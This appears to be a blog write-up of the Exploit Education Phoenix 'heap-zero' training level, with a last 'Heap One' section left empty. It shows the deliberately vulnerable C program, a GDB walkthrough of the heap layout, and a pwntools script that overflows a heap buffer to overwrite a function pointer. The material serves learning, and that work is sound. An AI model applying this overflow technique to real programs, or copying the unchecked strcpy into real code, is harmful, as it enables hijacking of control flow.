---
layout: post
title:  "Phoenix Heap"
date:   2021-02-22 00:00:00 +0000
categories: ExploitEducation
---
# Heap Zero
## Description
Link[https://exploit.education/phoenix/heap-zero/]
```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control, and execute the winner function?
 *
 * Why do C programmers make good Buddhists?
 * Because they're not object orientated.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```
## Analyse
1. The `malloc` allocate a piece of memory on the heap. And the allocated memory is next to the previous one. 
2. The `strcpy` function can copy a string without the checking the string length. When we copy a unknow length string, it can cause memory overflow.
3. Here, the objects `d` and `f` are created next to each other and `d` is before `f`. From GDB debuging, we can see there are 0x50 bytes between `d` and `f` objects. So we need to write 80 char to reach `f` object, then write 0x400abd (`winner` function) to overwrite 0x400ace.
    ```
    (gdb) x/gx $rbp-0x8
    0x7fffffffe618: 0x00007ffff7ef6010
    (gdb) x/gx $rbp-0x10
    0x7fffffffe610: 0x00007ffff7ef6060
    (gdb) x/20gx 0x00007ffff7ef6010
    0x7ffff7ef6010: 0x0000000000000000      0x0000000000000000   -> 0x7ffff7ef6010 is `d`
    0x7ffff7ef6020: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6030: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6040: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6050: 0x0000000000000000      0x0000000000000051
    0x7ffff7ef6060: 0x0000000000400ace      0x0000000000000000   -> 0x7ffff7ef6060 is `f`, 0x400ace is nowinner()
    ```

## Solution
```python
from pwn import *

payload = "A" * 80 + "\xbd\x0a\x40"
p = process(["/opt/phoenix/amd64/heap-zero", payload])
p.interactive()
```

# Heap One
## Description

## Analyse


## Solution